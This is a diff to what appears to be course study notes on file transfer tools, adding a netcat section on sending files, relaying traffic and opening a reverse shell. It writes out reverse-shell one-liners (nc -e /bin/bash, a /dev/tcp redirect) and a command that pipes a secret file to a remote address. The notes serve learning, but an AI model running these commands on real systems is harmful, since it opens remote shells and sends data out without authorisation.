@@ -7,6 +7,7 @@
 - FTPS
 - SFTP
 - SCP
+- NETCAT
 
 ## TFTP
 - RC 1350 Rev2
@@ -89,3 +90,45 @@ proxychains scp student@localhost:secretstuff.txt .
 proxychains scp secretstuff.txt student@localhost:
 ```
 Use proxychains to scp over a port forward
+
+
+## NETCAT
+```
+nc -lvp 9001 < file.txt
+```
+Sends a file
+
+```
+nc 172.16.82.106 9001 > newfile.txt
+```
+Receives a file
+
+```
+mknod mypipe p
+nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
+```
+Setup a relay
+
+`mknod mypipe p` creates a "named pipe" which stores the data in volatile memory
+
+### Open a Reverse Shell
+```
+nc -lvp 9999
+```
+Open listening port on host machine
+
+```
+nc -c /bin/bash 10.10.0.40 9999
+nc -e /bin/bash 10.10.0.40 9999
+/bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
+```
+Opening shell on remote machine
+## /Dev/TCP
+
+```
+/Dev/TCP/<IP Address>/<Port>
+```
+
+```
+cat secret.txt > /dev/tcp/10.10.0.40/1111
+```
